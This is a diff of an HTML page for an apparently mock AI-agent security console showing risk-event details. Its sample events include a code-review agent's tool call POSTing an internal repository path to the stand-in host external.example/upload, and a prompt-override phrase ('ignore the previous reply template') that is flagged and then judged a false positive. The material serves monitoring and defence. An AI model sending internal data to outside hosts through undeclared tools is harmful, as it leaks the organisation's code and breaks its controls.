@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
@@ -6,21 +6,34 @@
   <link rel="stylesheet" href="../../css/style.css">
   <style>
     .detail-layout { display: grid; grid-template-columns: 1fr 360px; gap: 16px; align-items: start; }
-    .evidence-box { background: #F5F7FA; border: 1px solid #EBEEF5; border-radius: 4px; padding: 12px; line-height: 1.8; }
+    .evidence-tabs { display: flex; gap: 8px; border-bottom: 1px solid #EBEEF5; margin: 12px 0; }
+    .evidence-tab { padding: 8px 10px; border-radius: 4px 4px 0 0; color: #606266; cursor: pointer; }
+    .evidence-tab.active { color: #409EFF; background: #ECF5FF; font-weight: 600; }
+    .evidence-box { background: #F5F7FA; border: 1px solid #EBEEF5; border-radius: 4px; padding: 12px; line-height: 1.8; min-height: 140px; }
+    .evidence-code { white-space: pre; overflow: auto; max-height: 300px; font-family: Consolas, "Courier New", monospace; }
+    .context-preview { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 10px; }
+    .context-item { border: 1px solid #EBEEF5; border-radius: 4px; padding: 10px; min-width: 0; }
+    .context-stage { color: #909399; margin-bottom: 6px; font-size: 12px; }
+    .context-text { color: #303133; line-height: 1.7; }
     .evidence-mark { background: #FFF0F0; color: #D93026; padding: 1px 3px; border-radius: 3px; }
     .action-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
+    .mono { font-family: Consolas, "Courier New", monospace; }
+    @media (max-width: 1400px) {
+      .detail-layout { grid-template-columns: 1fr; }
+      .context-preview { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+    }
   </style>
 </head>
 <body class="page-content">
   <div class="sub-page">
     <div class="page-header">
       <div>
-        <div class="page-title">风险事件详情 <span class="tag tag-danger">高风险</span> <span class="tag tag-warning">In Progress</span></div>
-        <div class="page-subtitle">EVT-2026-A018 | trace_id: TRC-20260416-018 | span_id: sp_04_tool | risk_stage: 工具能力边界确认</div>
+        <div class="page-title">风险事件详情 <span id="riskLevelTag" class="tag tag-danger">高风险</span> <span id="statusTag" class="tag tag-warning">处理中</span></div>
+        <div class="page-subtitle" id="pageSubtitle">EVT-2026-A018 | trace_id: TRC-20260416-018 | span_id: sp_04_tool | risk_stage: 工具能力边界确认</div>
       </div>
       <div style="display:flex;gap:8px;">
-        <button class="btn btn-default" onclick="window.parent.loadPage('pages/events/event-list.html','风险事件',null)">返回列表</button>
-        <button class="btn btn-primary" onclick="window.parent.loadPage('pages/monitor/trace-list.html','风险溯源',null)">查看 Trace</button>
+        <button class="btn btn-default" onclick="backToList()">返回列表</button>
+        <button class="btn btn-primary" onclick="goTrace()">查看风险溯源</button>
       </div>
     </div>
 
@@ -30,46 +43,57 @@
           <div class="card-header"><div class="card-title">事件概况</div></div>
           <div class="card-body">
             <div class="desc-list">
-              <div class="desc-item"><div class="desc-label">风险类型</div><div class="desc-value">工具能力边界越界</div></div>
-              <div class="desc-item"><div class="desc-label">置信度</div><div class="desc-value">0.91</div></div>
-              <div class="desc-item"><div class="desc-label">标准风险阶段</div><div class="desc-value">工具能力边界确认</div></div>
-              <div class="desc-item"><div class="desc-label">事件状态</div><div class="desc-value"><span class="tag tag-warning">In Progress</span></div></div>
-              <div class="desc-item"><div class="desc-label">关联应用</div><div class="desc-value">研发代码审查助手</div></div>
-              <div class="desc-item"><div class="desc-label">关联智能体</div><div class="desc-value">代码审查工作流 / ReviewChain.invoke</div></div>
-              <div class="desc-item"><div class="desc-label">关联工具</div><div class="desc-value">external_http_post</div></div>
-              <div class="desc-item"><div class="desc-label">关联资源</div><div class="desc-value">external.example/upload</div></div>
-              <div class="desc-item"><div class="desc-label">检测器</div><div class="desc-value">tool-boundary-detector</div></div>
-              <div class="desc-item"><div class="desc-label">规则版本</div><div class="desc-value">tool-boundary-v1.8.2</div></div>
+              <div class="desc-item"><div class="desc-label">事件编号</div><div class="desc-value mono" id="eventId">EVT-2026-A018</div></div>
+              <div class="desc-item"><div class="desc-label">发生时间</div><div class="desc-value" id="eventTime">2026-04-16 10:25:33</div></div>
+              <div class="desc-item"><div class="desc-label">风险类型</div><div class="desc-value" id="riskType">工具能力边界越界</div></div>
+              <div class="desc-item"><div class="desc-label">置信度</div><div class="desc-value" id="confidence">0.91</div></div>
+              <div class="desc-item"><div class="desc-label">标准风险阶段</div><div class="desc-value" id="riskStage">工具能力边界确认</div></div>
+              <div class="desc-item"><div class="desc-label">事件状态</div><div class="desc-value" id="eventStatus"><span class="tag tag-warning">处理中</span></div></div>
+              <div class="desc-item"><div class="desc-label">关联应用</div><div class="desc-value" id="appName">研发代码审查助手</div></div>
+              <div class="desc-item"><div class="desc-label">所属部门</div><div class="desc-value" id="deptName">研发部</div></div>
+              <div class="desc-item"><div class="desc-label">关联智能体</div><div class="desc-value" id="agentName">代码审查工作流 / ReviewChain.invoke</div></div>
+              <div class="desc-item"><div class="desc-label">关联工具</div><div class="desc-value" id="toolName">external_http_post</div></div>
+              <div class="desc-item"><div class="desc-label">关联资源</div><div class="desc-value" id="resourceName">external.example/upload</div></div>
+              <div class="desc-item"><div class="desc-label">平台动作</div><div class="desc-value" id="platformAction"><span class="tag tag-warning">已建议限制</span></div></div>
+              <div class="desc-item"><div class="desc-label">检测器</div><div class="desc-value" id="detectorName">tool-boundary-detector</div></div>
+              <div class="desc-item"><div class="desc-label">规则版本</div><div class="desc-value mono" id="ruleVersion">tool-boundary-v1.8.2</div></div>
             </div>
           </div>
         </div>
 
         <div class="card">
-          <div class="card-header"><div class="card-title">证据面板</div><span class="tag tag-success">已脱敏</span></div>
+          <div class="card-header"><div class="card-title">上下文预览</div><span class="tag tag-primary">上下文片段</span></div>
           <div class="card-body">
-            <div class="evidence-box">
-              Tool Input: { "url": "https://external.example/upload", "payload": "<span class="evidence-mark">repo_path=internal/payment</span>", "reason": "code review context" }
+            <div class="context-preview" id="contextPreview"></div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header"><div class="card-title">证据工作区</div><span class="tag tag-success" id="redactionTag">已脱敏</span></div>
+          <div class="card-body">
+            <div class="alert-box alert-warning"><span class="alert-icon">!</span><span id="evidenceFinding">检测到未声明工具发起外联数据流，Tool Input 中包含内部仓库路径片段。</span></div>
+            <div class="evidence-tabs">
+              <div class="evidence-tab active" onclick="switchEvidenceTab(this,'summary')">证据摘要</div>
+              <div class="evidence-tab" onclick="switchEvidenceTab(this,'json')">格式化 JSON</div>
+              <div class="evidence-tab" onclick="switchEvidenceTab(this,'raw')">原始载荷</div>
+              <div class="evidence-tab" onclick="switchEvidenceTab(this,'rule')">规则解释</div>
             </div>
-            <div class="form-hint" style="margin-top:8px;">source_field: tool.input | evidence_offset: 63-89 | raw_ref: minio://agentsec/raw/2026/04/16/sp_04_tool.json</div>
+            <div class="evidence-box"><pre class="evidence-code" id="evidenceCode"></pre></div>
+            <div class="form-hint" id="evidenceMeta" style="margin-top:8px;">source_field: tool.input | evidence_offset: 63-89 | raw_ref: minio://agentsec/raw/2026/04/16/sp_04_tool.json</div>
           </div>
         </div>
 
         <div class="card">
           <div class="card-header"><div class="card-title">处置记录</div></div>
-          <div class="card-body">
-            <div class="timeline">
-              <div class="timeline-item"><div class="timeline-dot red"></div><div class="timeline-content"><div class="timeline-time">2026-04-16 10:25:33</div><div class="timeline-text">检测引擎生成风险事件</div><div class="timeline-detail">状态：New</div></div></div>
-              <div class="timeline-item"><div class="timeline-dot orange"></div><div class="timeline-content"><div class="timeline-time">2026-04-16 10:31:08</div><div class="timeline-text">SOC 用户确认风险</div><div class="timeline-detail">状态：Confirmed，负责人：张安全</div></div></div>
-              <div class="timeline-item"><div class="timeline-dot gray"></div><div class="timeline-content"><div class="timeline-time">待执行</div><div class="timeline-text">Tool 范围限制或接受风险审批</div></div></div>
-            </div>
-          </div>
+          <div class="card-body"><div class="timeline" id="eventTimeline"></div></div>
         </div>
+
         <div class="card">
           <div class="card-header"><div class="card-title">复核结论</div></div>
           <div class="card-body">
             <div class="desc-list">
-              <div class="desc-item"><div class="desc-label">误报原因</div><div class="desc-value">暂无，当前事件已确认进入处理中。</div></div>
-              <div class="desc-item"><div class="desc-label">接受风险原因</div><div class="desc-value">暂无，如业务确认接受风险需关联审批编号。</div></div>
+              <div class="desc-item"><div class="desc-label">误报原因</div><div class="desc-value" id="fpReason">暂无，当前事件已确认进入处理中。</div></div>
+              <div class="desc-item"><div class="desc-label">接受风险原因</div><div class="desc-value" id="acceptReason">暂无，如业务确认接受风险需关联审批编号。</div></div>
             </div>
           </div>
         </div>
@@ -80,22 +104,24 @@
           <div class="card-header"><div class="card-title">处置动作</div></div>
           <div class="card-body">
             <div class="action-grid">
-              <button class="btn btn-primary" onclick="toastSuccess('事件已确认')">补充说明</button>
+              <button class="btn btn-primary" onclick="openModal('progressModal')">更新进度</button>
+              <button class="btn btn-default" onclick="openModal('assignModal')">指派负责人</button>
               <button class="btn btn-warning" onclick="openModal('actionModal')">下发限制</button>
-              <button class="btn btn-default" onclick="toastSuccess('已标记误报并记录原因')">标记误报</button>
-              <button class="btn btn-default" onclick="toastSuccess('已记录接受风险审批')">接受风险</button>
+              <button class="btn btn-default" onclick="openModal('falsePositiveModal')">标记误报</button>
+              <button class="btn btn-default" onclick="openModal('acceptRiskModal')">接受风险</button>
+              <button class="btn btn-default" onclick="toastSuccess('事件摘要已生成')">生成摘要</button>
             </div>
             <hr class="divider">
-            <div class="alert-box alert-warning"><span class="alert-icon">!</span><span>当前建议优先限制 Tool 范围，避免直接影响整个应用。</span></div>
+            <div class="alert-box alert-warning"><span class="alert-icon">!</span><span id="actionHint">当前建议优先限制 Tool 范围，避免直接影响整个应用。</span></div>
           </div>
         </div>
         <div class="card">
           <div class="card-header"><div class="card-title">审计要求</div></div>
           <div class="card-body">
             <ul style="color:#606266;line-height:1.9;padding-left:18px;list-style:disc;">
-              <li>记录处置范围、TTL、操作人和审批编号。</li>
-              <li>误报必须填写原因，进入规则优化样本。</li>
-              <li>接受风险必须关联业务负责人审批。</li>
+              <li>状态变更、指派、限制、误报和接受风险都必须留痕。</li>
+              <li>误报必须填写原因，可进入规则优化样本。</li>
+              <li>接受风险必须关联业务负责人审批和有效期。</li>
             </ul>
           </div>
         </div>
@@ -103,18 +129,231 @@
     </div>
   </div>
 
+  <div class="modal-overlay" id="progressModal">
+    <div class="modal-box modal-md">
+      <div class="modal-header"><div class="modal-title">更新处置进度</div><div class="modal-close" onclick="closeModal('progressModal')">×</div></div>
+      <div class="modal-body"><form id="progressForm">
+        <div class="form-row"><div class="form-label required">目标状态</div><div class="form-field"><select class="form-select" required><option>处理中</option><option>待关闭</option><option>已关闭</option></select></div></div>
+        <div class="form-row"><div class="form-label required">进度说明</div><div class="form-field"><textarea class="form-textarea" required placeholder="说明当前处置进度、证据判断和下一步动作"></textarea></div></div>
+      </form></div>
+      <div class="modal-footer"><button class="btn btn-default" onclick="closeModal('progressModal')">取消</button><button class="btn btn-primary" onclick="submitModal('progressForm','progressModal','处置进度已更新并写入审计')">保存</button></div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="assignModal">
+    <div class="modal-box modal-md">
+      <div class="modal-header"><div class="modal-title">指派负责人</div><div class="modal-close" onclick="closeModal('assignModal')">×</div></div>
+      <div class="modal-body"><form id="assignForm">
+        <div class="form-row"><div class="form-label required">负责人</div><div class="form-field"><select class="form-select" required><option value="">请选择负责人</option><option>张安全</option><option>李运营</option><option>王合规</option><option>赵研发</option></select></div></div>
+        <div class="form-row"><div class="form-label">备注</div><div class="form-field"><textarea class="form-textarea" placeholder="说明指派原因或协作要求"></textarea></div></div>
+      </form></div>
+      <div class="modal-footer"><button class="btn btn-default" onclick="closeModal('assignModal')">取消</button><button class="btn btn-primary" onclick="submitModal('assignForm','assignModal','负责人已更新并写入审计')">确认指派</button></div>
+    </div>
+  </div>
+
   <div class="modal-overlay" id="actionModal">
     <div class="modal-box modal-md">
       <div class="modal-header"><div class="modal-title">下发限制动作</div><div class="modal-close" onclick="closeModal('actionModal')">×</div></div>
-      <div class="modal-body">
-        <div class="form-row"><div class="form-label">范围</div><div class="form-field"><select class="form-select"><option>Tool: external_http_post</option><option>Agent: 研发代码审查助手</option><option>App: app_rd_code_review</option></select></div></div>
-        <div class="form-row"><div class="form-label">TTL</div><div class="form-field"><select class="form-select"><option>1 小时</option><option>6 小时</option><option>24 小时</option></select></div></div>
-        <div class="form-row"><div class="form-label">二次确认</div><div class="form-field"><input class="form-control" placeholder="输入审批单号或 MFA 验证码"></div></div>
-      </div>
-      <div class="modal-footer"><button class="btn btn-default" onclick="closeModal('actionModal')">取消</button><button class="btn btn-warning" onclick="closeModal('actionModal');toastSuccess('限制动作已下发并写入审计')">确认下发</button></div>
+      <div class="modal-body"><form id="actionForm">
+        <div class="form-row"><div class="form-label required">范围</div><div class="form-field"><select class="form-select" id="actionScope" required><option>Tool: external_http_post</option><option>Agent: 研发代码审查助手</option><option>App: app_rd_code_review</option></select></div></div>
+        <div class="form-row"><div class="form-label required">TTL</div><div class="form-field"><select class="form-select" required><option>1 小时</option><option>6 小时</option><option>24 小时</option></select></div></div>
+        <div class="form-row"><div class="form-label required">审批编号</div><div class="form-field"><input class="form-control" required placeholder="输入审批单号或 MFA 验证码"></div></div>
+        <div class="form-row"><div class="form-label">备注</div><div class="form-field"><textarea class="form-textarea" placeholder="说明限制依据和影响范围"></textarea></div></div>
+      </form></div>
+      <div class="modal-footer"><button class="btn btn-default" onclick="closeModal('actionModal')">取消</button><button class="btn btn-warning" onclick="submitModal('actionForm','actionModal','限制动作已下发并写入审计')">确认下发</button></div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="falsePositiveModal">
+    <div class="modal-box modal-md">
+      <div class="modal-header"><div class="modal-title">标记误报</div><div class="modal-close" onclick="closeModal('falsePositiveModal')">×</div></div>
+      <div class="modal-body"><form id="fpForm">
+        <div class="form-row"><div class="form-label required">误报原因</div><div class="form-field"><select class="form-select" required><option value="">请选择原因</option><option>测试数据或演练数据</option><option>业务允许的工具调用</option><option>规则阈值过严</option><option>上下文缺失导致误判</option></select></div></div>
+        <div class="form-row"><div class="form-label">样本处理</div><div class="form-field"><select class="form-select"><option>进入规则优化样本池</option><option>仅记录本次结论</option></select></div></div>
+        <div class="form-row"><div class="form-label required">说明</div><div class="form-field"><textarea class="form-textarea" required placeholder="说明误报判断依据"></textarea></div></div>
+      </form></div>
+      <div class="modal-footer"><button class="btn btn-default" onclick="closeModal('falsePositiveModal')">取消</button><button class="btn btn-primary" onclick="submitModal('fpForm','falsePositiveModal','已标记误报并写入审计')">提交</button></div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="acceptRiskModal">
+    <div class="modal-box modal-md">
+      <div class="modal-header"><div class="modal-title">接受风险审批记录</div><div class="modal-close" onclick="closeModal('acceptRiskModal')">×</div></div>
+      <div class="modal-body"><form id="acceptForm">
+        <div class="form-row"><div class="form-label required">审批编号</div><div class="form-field"><input class="form-control" required placeholder="如 APR-20260416-003"></div></div>
+        <div class="form-row"><div class="form-label required">有效期</div><div class="form-field"><select class="form-select" required><option>7 天</option><option>30 天</option><option>90 天</option></select></div></div>
+        <div class="form-row"><div class="form-label required">接受原因</div><div class="form-field"><textarea class="form-textarea" required placeholder="说明业务原因、补偿控制和到期复核安排"></textarea></div></div>
+      </form></div>
+      <div class="modal-footer"><button class="btn btn-default" onclick="closeModal('acceptRiskModal')">取消</button><button class="btn btn-primary" onclick="submitModal('acceptForm','acceptRiskModal','接受风险记录已提交并写入审计')">提交</button></div>
     </div>
   </div>
 
   <script src="../../js/common.js"></script>
+  <script>
+    var activeEvidenceTab = 'summary';
+    var currentEvent = null;
+    var eventProfiles = {
+      'EVT-2026-A018': {
+        id: 'EVT-2026-A018',
+        time: '2026-04-16 10:25:33',
+        traceId: 'TRC-20260416-018',
+        spanId: 'sp_04_tool',
+        riskLevel: '高风险',
+        riskTag: 'tag-danger',
+        status: '处理中',
+        statusTag: 'tag-warning',
+        riskType: '工具能力边界越界',
+        confidence: '0.91',
+        riskStage: '工具能力边界确认',
+        app: '研发代码审查助手',
+        dept: '研发部',
+        agent: '代码审查工作流 / ReviewChain.invoke',
+        tool: 'external_http_post',
+        resource: 'external.example/upload',
+        action: '<span class="tag tag-warning">已建议限制</span>',
+        detector: 'tool-boundary-detector',
+        rule: 'tool-boundary-v1.8.2',
+        source: 'tool.input',
+        offset: '63-89',
+        rawRef: 'minio://agentsec/raw/2026/04/16/sp_04_tool.json',
+        finding: '检测到未声明工具发起外联数据流，Tool Input 中包含内部仓库路径片段。',
+        context: ['用户提交代码审查任务，要求检查配置文件和网络调用。', '模型计划调用 repo_reader 与 external_http_post。', 'Tool Input 包含 external.example/upload 与 repo_path=internal/payment。', '响应输出包含内部仓库路径摘要，已脱敏。'],
+        json: '{\n  "span_id": "sp_04_tool",\n  "source_field": "tool.input",\n  "tool_name": "external_http_post",\n  "input": {\n    "url": "https://external.example/upload",\n    "payload": {\n      "repo_path": "internal/payment",\n      "reason": "code review context"\n    }\n  }\n}',
+        raw: 'POST /upload HTTP/1.1\nHost: external.example\n\n{"repo_path":"internal/payment","reason":"code review context"}',
+        ruleText: '规则 tool-boundary-v1.8.2：应用未声明外部 HTTP POST 能力，但 Span 中出现 external_http_post 工具调用，并携带内部资源路径时，进入工具能力边界复核。',
+        fpReason: '暂无，当前事件已确认进入处理中。',
+        acceptReason: '暂无，如业务确认接受风险需关联审批编号。',
+        hint: '当前建议优先限制 Tool 范围，避免直接影响整个应用。'
+      },
+      'EVT-2026-A012': {
+        id: 'EVT-2026-A012',
+        time: '2026-04-16 09:48:11',
+        traceId: 'TRC-20260416-012',
+        spanId: 'sp_06_output',
+        riskLevel: '中风险',
+        riskTag: 'tag-warning',
+        status: '已确认',
+        statusTag: 'tag-warning',
+        riskType: '敏感数据输出',
+        confidence: '0.84',
+        riskStage: '响应输出复核',
+        app: '人事档案助理',
+        dept: '人力资源部',
+        agent: '档案查询 Agent / ProfileReader.answer',
+        tool: 'hr_profile_reader',
+        resource: 'employee_profile',
+        action: '<span class="tag tag-info">已通知</span>',
+        detector: 'response-sensitive-detector',
+        rule: 'response-sensitive-v2.4.0',
+        source: 'llm.response',
+        offset: '118-146',
+        rawRef: 'minio://agentsec/raw/2026/04/16/sp_06_output.json',
+        finding: '响应输出中包含员工手机号片段，已脱敏展示，原文需要授权后查看。',
+        context: ['用户要求汇总候选员工联系信息。', '工具返回员工档案字段，包含手机号和部门。', '模型响应未完全压缩敏感字段。', '检测器对手机号片段进行脱敏展示。'],
+        json: '{\n  "span_id": "sp_06_output",\n  "source_field": "llm.response",\n  "output_excerpt": "员工联系方式：[PHONE_MASKED]",\n  "redaction_state": "redacted"\n}',
+        raw: 'LLM RESPONSE\n员工联系方式：[PHONE_MASKED]，部门：运营中心。原文已脱敏，需授权查看。',
+        ruleText: '规则 response-sensitive-v2.4.0：当模型响应包含手机号、证件号、员工档案字段等敏感信息时，生成敏感输出复核事件。',
+        fpReason: '暂无。',
+        acceptReason: '暂无。',
+        hint: '建议先通知应用负责人确认最小输出字段，必要时调整脱敏策略。'
+      },
+      'EVT-2026-A009': {
+        id: 'EVT-2026-A009',
+        time: '2026-04-16 09:12:04',
+        traceId: 'TRC-20260416-009',
+        spanId: 'sp_02_llm',
+        riskLevel: '低风险',
+        riskTag: 'tag-primary',
+        status: '误报',
+        statusTag: 'tag-info',
+        riskType: '提示词风险',
+        confidence: '0.43',
+        riskStage: '提示词复核',
+        app: '智能客服 Copilot',
+        dept: '客服中心',
+        agent: '客服问答 Agent / ReplyPlanner',
+        tool: 'crm_search',
+        resource: 'customer_ticket',
+        action: '<span class="tag tag-info">仅记录</span>',
+        detector: 'prompt-risk-detector',
+        rule: 'prompt-risk-low-confidence-v1.1',
+        source: 'prompt.input',
+        offset: '24-40',
+        rawRef: 'minio://agentsec/raw/2026/04/16/sp_02_llm.json',
+        finding: '命中低置信度提示词规则，人工复核后标记为误报样本。',
+        context: ['用户询问售后工单处理进度。', '提示词中出现“忽略之前回复模板”等普通表达。', '规则低置信度命中提示词风险。', '复核认为是业务话术，不构成风险。'],
+        json: '{\n  "span_id": "sp_02_llm",\n  "source_field": "prompt.input",\n  "matched_phrase": "忽略之前回复模板",\n  "confidence": 0.43\n}',
+        raw: 'USER PROMPT\n请忽略之前回复模板，用更简洁的方式告诉客户工单进度。',
+        ruleText: '规则 prompt-risk-low-confidence-v1.1：疑似覆盖原指令的表达需要结合上下文复核，低置信度命中不应直接触发限制动作。',
+        fpReason: '业务话术触发低置信度规则，已进入规则优化样本池。',
+        acceptReason: '不适用。',
+        hint: '当前事件已标记误报，建议关注规则优化样本即可。'
+      }
+    };
+
+    document.addEventListener('DOMContentLoaded', function() {
+      if (typeof updateBreadcrumb === 'function') {
+        updateBreadcrumb([{ label: '风险事件' }, { label: '风险事件详情' }]);
+      }
+      var id = new URLSearchParams(window.location.search).get('id') || 'EVT-2026-A018';
+      renderEvent(eventProfiles[id] || eventProfiles['EVT-2026-A018']);
+    });
+
+    function renderEvent(profile) {
+      currentEvent = profile;
+      document.getElementById('riskLevelTag').className = 'tag ' + profile.riskTag;
+      document.getElementById('riskLevelTag').textContent = profile.riskLevel;
+      document.getElementById('statusTag').className = 'tag ' + profile.statusTag;
+      document.getElementById('statusTag').textContent = profile.status;
+      document.getElementById('pageSubtitle').textContent = profile.id + ' | trace_id: ' + profile.traceId + ' | span_id: ' + profile.spanId + ' | risk_stage: ' + profile.riskStage;
+      ['eventId','eventTime','riskType','confidence','riskStage','appName','deptName','agentName','toolName','resourceName','detectorName','ruleVersion','evidenceFinding','fpReason','acceptReason','actionHint'].forEach(function(id) {
+        var map = { eventId: 'id', eventTime: 'time', riskType: 'riskType', confidence: 'confidence', riskStage: 'riskStage', appName: 'app', deptName: 'dept', agentName: 'agent', toolName: 'tool', resourceName: 'resource', detectorName: 'detector', ruleVersion: 'rule', evidenceFinding: 'finding', fpReason: 'fpReason', acceptReason: 'acceptReason', actionHint: 'hint' };
+        document.getElementById(id).textContent = profile[map[id]];
+      });
+      document.getElementById('eventStatus').innerHTML = '<span class="tag ' + profile.statusTag + '">' + profile.status + '</span>';
+      document.getElementById('platformAction').innerHTML = profile.action;
+      document.getElementById('evidenceMeta').textContent = 'source_field: ' + profile.source + ' | evidence_offset: ' + profile.offset + ' | raw_ref: ' + profile.rawRef;
+      document.getElementById('contextPreview').innerHTML = ['触发前文','模型计划','工具/资源','响应输出'].map(function(stage, idx) {
+        return '<div class="context-item"><div class="context-stage">' + stage + '</div><div class="context-text">' + profile.context[idx] + '</div></div>';
+      }).join('');
+      document.getElementById('eventTimeline').innerHTML =
+        '<div class="timeline-item"><div class="timeline-dot red"></div><div class="timeline-content"><div class="timeline-time">' + profile.time + '</div><div class="timeline-text">检测引擎生成风险事件</div><div class="timeline-detail">状态：待确认</div></div></div>' +
+        '<div class="timeline-item"><div class="timeline-dot orange"></div><div class="timeline-content"><div class="timeline-time">2026-04-16 10:31:08</div><div class="timeline-text">负责人复核事件</div><div class="timeline-detail">当前状态：' + profile.status + '</div></div></div>' +
+        '<div class="timeline-item"><div class="timeline-dot gray"></div><div class="timeline-content"><div class="timeline-time">待执行</div><div class="timeline-text">下一步处置或关闭确认</div></div></div>';
+      renderEvidence();
+    }
+
+    function switchEvidenceTab(el, tab) {
+      document.querySelectorAll('.evidence-tab').forEach(function(item){ item.classList.remove('active'); });
+      el.classList.add('active');
+      activeEvidenceTab = tab;
+      renderEvidence();
+    }
+
+    function renderEvidence() {
+      if (!currentEvent) return;
+      var content = '结论：' + currentEvent.finding + '\n\n证据锚点：' + currentEvent.traceId + ' / ' + currentEvent.spanId + '\n证据来源：' + currentEvent.source + '\n关联资源：' + currentEvent.resource;
+      if (activeEvidenceTab === 'json') content = currentEvent.json;
+      if (activeEvidenceTab === 'raw') content = currentEvent.raw;
+      if (activeEvidenceTab === 'rule') content = currentEvent.ruleText;
+      document.getElementById('evidenceCode').textContent = content;
+    }
+
+    function backToList() {
+      navigateTo('pages/events/event-list.html', '风险事件', 'event-list.html');
+    }
+
+    function goTrace() {
+      var url = 'pages/monitor/trace-list.html?trace_id=' + encodeURIComponent(currentEvent.traceId) + '&span_id=' + encodeURIComponent(currentEvent.spanId);
+      navigateTo(url, '风险溯源', '../monitor/trace-list.html?trace_id=' + encodeURIComponent(currentEvent.traceId) + '&span_id=' + encodeURIComponent(currentEvent.spanId));
+    }
+
+    function submitModal(formId, modalId, message) {
+      if (validateForm(formId)) {
+        toastSuccess(message);
+        closeModal(modalId);
+      }
+    }
+  </script>
 </body>
 </html>
